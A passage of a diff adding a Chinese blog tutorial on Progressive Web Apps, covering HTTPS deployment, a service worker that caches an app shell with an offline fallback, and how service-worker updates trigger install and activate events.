+&lt;h3 id=&quot;45-发布到服务器中&quot;&gt;4.5 发布到服务器中&lt;/h3&gt;
+
+&lt;p&gt;按章节 &lt;strong&gt;3. 基本组成结构&lt;/strong&gt; 中的图，至此准备工作结束，一个基本的 &lt;strong&gt;PWA&lt;/strong&gt; 应用已经完成，现在可以将整个站点发布到 nginx、apache等服务器中。&lt;/p&gt;
+
+&lt;p&gt;这里值得一提的是，&lt;strong&gt;&lt;u&gt;正确的 PWA 应用应该部署在 HTTPS 的环境下，即你需要安全证书&lt;/u&gt;&lt;/strong&gt;，不支持自签名证书，关于如何获取免费的 HTTPS 证书请参看另一篇文章 &lt;a href=&quot;https://vinny.cc/2017/10/lets-encrypt-ssl/&quot;&gt;使用Lets Encrypt为站点快速部署SSL证书&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;访问的截图如下：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align:center;&quot;&gt;
+&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/Screenshot_20180418-004321.png&quot; height=&quot;300px&quot; style=&quot;margin-left:5px;&quot; /&gt;
+
+&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/Screenshot_20180418-003023.png&quot; height=&quot;300px&quot; style=&quot;margin-left:5px;&quot; /&gt;
+
+&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/Screenshot_20180418-003027.png&quot; height=&quot;300px&quot; style=&quot;margin-left:5px;&quot; /&gt;
+&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;横幅的弹出，是由浏览器进行控制，条件是”&lt;strong&gt;站点被访问至少两次，这两次访问至少间隔五分钟&lt;/strong&gt;”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;46-实现基本的离线存储&quot;&gt;4.6 实现基本的离线存储&lt;/h3&gt;
+
+&lt;p&gt;目前我们的 &lt;strong&gt;service-worker.js&lt;/strong&gt; 没有做任何事情，只是在生命周期中进行了输出，现在我们需要实现站点的 &lt;strong&gt;离线存储&lt;/strong&gt;，修改后的脚本如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;use strict&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onInstall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;waitUntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CACHE_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addAll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;URL_TO_CACHE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;WORKER: Install completed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;skipWaiting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onActivate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[Serviceworker]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Activating!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// 这里的&quot;keyList&quot;就是&quot;var CACHE_NAME = CACHE_VERSION + &quot;:sw-cache::&quot;的数组        &lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;waitUntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keyList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// 这里的&quot;key&quot;就是&quot;V1.0.1:sw-cache::&quot;，掉上面缓存名称的遍历&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keyList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CACHE_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'[ServiceWorker] Removing old cache'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}));&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}));&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onFetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// console.log('Fetch event for &amp;gt;&amp;gt;&amp;gt; ', e.request.url);&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// 调用respondWith()方法劫持GET请求并返回&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;respondWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+            &lt;span class=&quot;c1&quot;&gt;// 缓存命中直接返回&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;warn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Not in Cache... Making Network request for '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;requet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fetchRequest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fetchRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;// 检查是否收到无效的响应&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'basic'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/offline.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+                &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;responseToCache&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+                &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CACHE_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;responseToCache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;// 没有检索到应该跳转到离线页面&lt;/span&gt;
+                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Failed to fetch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/offline.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// ----------------------------------------------------------------------&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CACHE_VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;V1.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CACHE_NAME&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CACHE_VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;:sw-cache::&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;URL_TO_CACHE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/manifest.json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/offline.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/css/amazeui.min.css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/css/app.css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/js/app.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/js/jquery.min.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/js/amazeui.min.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/img/user01.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/img/user02.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/img/user03.png&quot;&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// .....&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// Service Worker 事件注册&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;install&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onInstall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;activate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onActivate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fetch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onFetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;从上述脚本可知，我们对缓存定义了版本，版本主要实现缓存的更新，否则即使站点做了更新，用户在设备上访问的还是旧的内容。&lt;em&gt;URL_TO_CACHE&lt;/em&gt; 定义了需要预缓存的基本结构，又叫 &lt;strong&gt;&lt;a href=&quot;https://developers.google.com/web/fundamentals/architecture/app-shell&quot;&gt;App Shell&lt;/a&gt;&lt;/strong&gt;，在 &lt;strong&gt;install&lt;/strong&gt; 中进行安装，在 &lt;strong&gt;fetch&lt;/strong&gt; 中进行读取，命中则直接返回，否则重新请求。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;更多完整的 &lt;strong&gt;ServiceWorker&lt;/strong&gt; 生命周期介绍请参看 &lt;a href=&quot;https://developers.google.com/web/fundamentals/primers/service-workers/&quot;&gt;服务工作线程：简介&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;47-激活更新事件&quot;&gt;4.7 激活更新事件&lt;/h3&gt;
+
+&lt;p&gt;当站点的内容更新发布到 HTTPS 服务器中时，用户在手机上访问的 PWA 应用并不会取更新的内容，还是继续从手机缓存中获取，此时就需要触发服务工作线程的更新，也就是 &lt;strong&gt;Active&lt;/strong&gt; 激活动作，将老的缓存删除，重新从服务器中获取新的内容并缓存起来。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;服务工作线程更新的条件&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;用户打开 PWA应用（可以使chrome中，也可以是桌面），浏览器会尝试从后台重新下载定义服务工作线程的脚本文件。&lt;strong&gt;&lt;u&gt;若下载的服务工作线程文件与当前的服务器工作线程文件存在字节的差异，则视为新的服务工作线程&lt;/u&gt;&lt;/strong&gt;。这意味着想要站点在用户设备上激活更新事件，每次发布都需要修改 &lt;strong&gt;service-worker.js&lt;/strong&gt; 文件，在服务工作线程文件中修改版本号、回车、加个空格都视为字节的变化。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;新服务工作线程会启动，且触发 &lt;strong&gt;install&lt;/strong&gt; 事件&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;此时，旧服务工作线程仍控制着当前页面，新服务工作线程进入 &lt;strong&gt;waiting&lt;/strong&gt; 状态。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/sw11.png&quot; alt=&quot;sw11&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;当关掉重新打开 PWA应用 时，就工作线程被终止，新服务线程取得控制权，同时触发 &lt;strong&gt;activate&lt;/strong&gt; 事件，删除旧的缓存&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/sw12.png&quot; alt=&quot;sw12&quot; /&gt;&lt;strong&gt;总结激活更新&lt;/strong&gt;&lt;/p&gt;
+
+    &lt;p&gt;更新 html 内容，修改 &lt;strong&gt;Service Worker&lt;/strong&gt;，打开 PWA应用，由于服务工作线程已经改变，触发 &lt;strong&gt;install&lt;/strong&gt; 事件，新的缓存被安装，关闭 PWA应用 再重新打开，接手，触发 &lt;strong&gt;activate&lt;/strong&gt; 事件删除老缓存，页面刷新为新的html内容。&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;5-对-pwa-应用进行审计&quot;&gt;5. 对 PWA 应用进行审计&lt;/h2&gt;
+
